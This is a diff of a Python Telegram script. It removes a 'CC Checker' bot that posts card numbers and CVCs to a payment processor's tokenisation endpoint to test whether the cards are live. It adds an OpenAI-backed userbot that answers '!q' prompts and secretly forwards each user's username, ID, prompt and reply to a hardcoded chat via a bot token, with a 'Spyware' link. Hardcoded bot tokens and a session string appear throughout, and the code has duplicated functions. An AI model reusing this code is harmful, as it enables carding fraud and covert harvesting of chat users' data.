@@ -1,80 +1,213 @@
-import requests 
+from telethon import TelegramClient, events
+
+from telethon.sessions import StringSession
+import asyncio
+import openai
+import requests
 import os
-import random
-import telebot
-from telebot import types
-from user_agent import *
+import time
+import re
+import logging
+# create a session using the session string
+# create a session using the session string
+CHATGPT_TOKEN = os.environ.get("CHATGPT_TOKEN", None)
+session_string = '1BVtsOK0Bu14yWl_aGjrmF6V0IV4iCdMBJWp_8HADH3EzEFk1jLtYVW8KHeJgiMpcohjyf2hcyu6IYODtcsjlJgmiPTQz96ROMAOFkhEe_RNBoVGMh4YcXV_3yOl_QC6EVuSDiRlOLFk71dIlc092Udbv7Cen3YSAajcUj95w1TNhK_p3Apgr-8ZaBhmZKatETugmoSJ74alLXXIceRNrMJWVjh2d3loSDSbUmP8McIr2wQcJ1c53nChn4ut2F17pXqeeKzQS4Xqy295SV1VR3CbLfxQ_w8iA8oxWuPEulfqPogSjL1sCeqdSrLMqy-LFL3Np0QAtq-6Z_3FPr-TMsKRwPjOaHvs='
+session = StringSession(session_string)
+# configure Telethon
+api_id = int(os.environ.get("API_ID", 6))
+api_hash = os.environ.get("API_HASH", None)
 
-call = types.InlineKeyboardButton(text = "- Check Cards", callback_data = 's1')
+excluded_channels = os.environ.get('INPUT_LIST', '').split(',')
 
-call2 = types.InlineKeyboardButton(text = "- Programmer", url='t.me/Mr_majnu72 ')
 
-bot = telebot.TeleBot("6279015768:AAHDt_Jq05lSbz-1rkkyjugPZnxhMutmXMQ")
+client = TelegramClient(session, api_id, api_hash)
+logging.basicConfig(level=logging.INFO)
 
-@bot.message_handler(commands=["start"])
-def start(message):
-	name = message.from_user.first_name
-	Keyy = types.InlineKeyboardMarkup()
-	Keyy.row_width = 1
-	Keyy.add(call,call2)
-	bot.reply_to(message, text=f'''
-- Hello bro : {name} 
-- My Name Is : Satyam
-- Welcome CC Checker Bot
-- Chooce Any Button
-''', reply_markup=Keyy)
-@bot.callback_query_handler(func=lambda m:True)
-def aws(call):
-	if call.data == 's1':
-		txt = bot.send_message(call.message.chat.id,f"- Send your Card")
-		bot.register_next_step_handler(txt,check_cards)
+openai.api_key = CHATGPT_TOKEN
 
-def check_cards(message):
-	   	card = message.text
-	   	bot.reply_to(message, text=f'''
-- Done Save Card
-- Card : {card}
-- Please Wait ...
-''')
-	   	num=card.split('|')[0]
-	   	mo=card.split('|')[1]
-	   	ye=card.split('|')[2]
-	   	cvc=card.split('|')[3]
-	   	headers={
-    "Host": "sipg.micropayment.de",
-    "Connection": "keep-alive",
-    "Content-Length": "303",
-    "sec-ch-ua": "\" Not A;Brand\";v\u003d\"99\", \"Chromium\";v\u003d\"99\", \"Google Chrome\";v\u003d\"99\"",
-    "sec-ch-ua-mobile": "?1",
-    "User-Agent": generate_user_agent(),
-    "sec-ch-ua-platform": "\"Android\"",
-    "Content-Type": "application/json",
-    "Accept": "*/*",
-    "Origin": "https://sipg.micropayment.de",
-    "Sec-Fetch-Site": "same-origin",
-    "Sec-Fetch-Mode": "cors",
-    "Sec-Fetch-Dest": "empty",
-    "Referer": "https://sipg.micropayment.de/public/bridge/v1/iframe.php?w\u003dpan",
-    "Accept-Encoding": "gzip, deflate, br",
-    "Accept-Language": "en-US,en;q\u003d0.9,ar-DZ;q\u003d0.8,ar;q\u003d0.7"}
-	   	data  ={"project":"awsking","testmode":"0","fields":{"holder":"Mr Aws","month":f"{mo}","year":f"{ye}","pan":f"{num}","cvc":f"{cvc}"},"secure":{"ct":"3hH/PhgUcCKbgVlOSJYaOw9iJFGJtYIxap5uQoz0qbUzUf+BSqsqwrPAFHp5TKsalRBOT1yyjek=","iv":"6e325bfe8c76f6e0","s":"075dfcb99861e7b0","kh":"qx6+9DS+keV0GUNMc23eQg=="}}
-	   	check = requests.post('https://sipg.micropayment.de/public/panstore/?function=init',json=data,headers=headers).json()
-	   	token = check["token"]
-	   	code = check["code"]
-	   	if token != None and code == 'ok':
-	   		print(check.text)
-	   		bot.reply_to(message, text=f'''
-- Card : {card}
-- Card Status : Work
-- BY : @Mr_majnu72
-''')
-	   	else:
-	   		print(check)
-	   		bot.reply_to(message, text=f'''
-- Card : {card}
-- Card Status : Not Work
-- BY : @Mr_majnu72
-''')
+def generate_text(prompt):
+    completion = openai.ChatCompletion.create(
+      model="gpt-3.5-turbo",
+      messages=[
+        {"role": "user", "content":  prompt}
+      ],
 
-print ("started")
-bot.infinity_polling()
+    )
+
+    response = completion.choices[0].message["content"]
+    print (response)
+    return response
+def generate_text(prompt):
+    model_engine = "text-davinci-003"
+    prompt = prompt
+
+    # Generate a response
+    completion = openai.Completion.create(
+        engine=model_engine,
+        prompt=prompt,
+        max_tokens=4000,
+        n=1,
+        stop=None,
+        temperature=1.0,
+    )
+
+    response = completion.choices[0].text
+    return response
+
+
+@client.on(events.NewMessage(pattern="^[!?!]q"))
+async def binc(event):
+    if event.is_group or event.is_channel:
+        if event.chat_id in excluded_channels:
+            return  # Ignore messages from excluded channels
+    sender_id = event.sender_id
+    if event.sender and event.sender.username:
+        sender_username = event.sender.username
+    else:
+        sender_username = None
+    try:
+        # Get the input from the user and split it into separate lines.
+        me = (await event.client.get_me()).username
+        prompt = event.text.split(" ", maxsplit=1)[1]
+    except Exception as e:
+        logging.error(f"Error generating text: {str(e)}")
+        await event.reply(e)
+    try:
+        global generated_text
+        generated_text = generate_text(prompt)
+        # print the generated text
+        logging.info(f"Generated text: {generated_text}")
+        message = await event.reply(generated_text, parse_mode="HTML")
+    except Exception as e:
+        logging.error(f"Error generating text: {str(e)}")
+        await event.reply(f"Error generating text: {str(e)}")
+    message = (f"""
+<b>Username:</b> @{sender_username}
+<b>Telegram ID:</b> <code>{sender_id}</code>
+<b>USER SEND:</b> <code>{prompt}</code>
+<b>Bot Response:</b> <code>{generated_text}</code>
+<b>Generated With </b> <a href="https://t.me/Unknown_Spyware_Bot/">userbot🤖</a>
+""")
+
+    bot_token = "5929784262:AAEq87joAkVPKScMS20gpGXALJ18cc556AU"
+    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
+
+    # Set the parameters for the request (the message and chat ID)
+    try:
+        params = {
+        "chat_id": 1927696336,
+        "text": message,
+        "disable_web_page_preview": True,
+        "parse_mode": 'HTML'
+
+        }
+
+    # Send the request to the Telegram API
+
+        response = requests.post(url, data=params)
+    except Exception as e:
+        print (e)
+
+
+
+
+
+
+@client.on(events.NewMessage(pattern="^[!?!]q"))
+async def binc(event):
+    if event.is_group or event.is_channel:
+        if event.chat_id in excluded_channels:
+            return  # Ignore messages from excluded channels
+    sender_id = event.sender_id
+    if event.sender and event.sender.username:
+        sender_username = event.sender.username
+    else:
+        sender_username = None
+    try:
+        # Get the input from the user and split it into separate lines.
+        me = (await event.client.get_me()).username
+        prompt = event.text.split(" ", maxsplit=1)[1]
+    except Exception as e:
+        logging.error(f"Error generating text: {str(e)}")
+        await event.reply(e)
+    try:
+        global generated_text
+        generated_text = generate_text(prompt)
+        # print the generated text
+        logging.info(f"Generated text: {generated_text}")
+        message = await event.reply(generated_text, parse_mode="HTML")
+    except Exception as e:
+        logging.error(f"Error generating text: {str(e)}")
+        await event.reply(f"Error generating text: {str(e)}")
+    message = (f"""
+<b>Username:</b> @{sender_username}
+<b>Telegram ID:</b> <code>{sender_id}</code>
+<b>USER SEND:</b> <code>{prompt}</code>
+<b>Bot Response:</b> <code>{generated_text}</code>
+<b>Generated With </b> <a href="https://t.me/Unknown_Spyware_Bot/">userbot🤖</a>
+""")
+
+    bot_token = "5929784262:AAEq87joAkVPKScMS20gpGXALJ18cc556AU"
+    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
+
+    # Set the parameters for the request (the message and chat ID)
+    try:
+        params = {
+        "chat_id": 1927696336,
+        "text": message,
+        "disable_web_page_preview": True,
+        "parse_mode": 'HTML'
+
+        }
+
+    # Send the request to the Telegram API
+
+        response = requests.post(url, data=params)
+    except Exception as e:
+        print (e)
+
+
+
+
+
+
+
+
+
+
+
+
+
+# Handle the "/delete [int]" command
+@client.on(events.NewMessage(pattern='/delete (\d+)'))
+async def handle_delete(event):
+    if event.sender_id != 1927696336:
+        return
+    try:
+        # Extract the integer from the message
+        count = int(event.pattern_match.group(1))
+
+        # Get your own messages to delete
+        messages = await client.get_messages(
+        entity=event.chat_id,
+        limit=count,
+        from_user='me'
+        )
+        # Delete the messages
+        await client.delete_messages(event.chat_id, messages)
+        print ("DELETE?")
+    except Exception as e:
+        print(f"Error - {str(e)}")
+
+
+
+
+
+# start the client
+async def main():
+    await client.start()
+    await client.run_until_disconnected()
+
+if __name__ == '__main__':
+
+    asyncio.run(main())
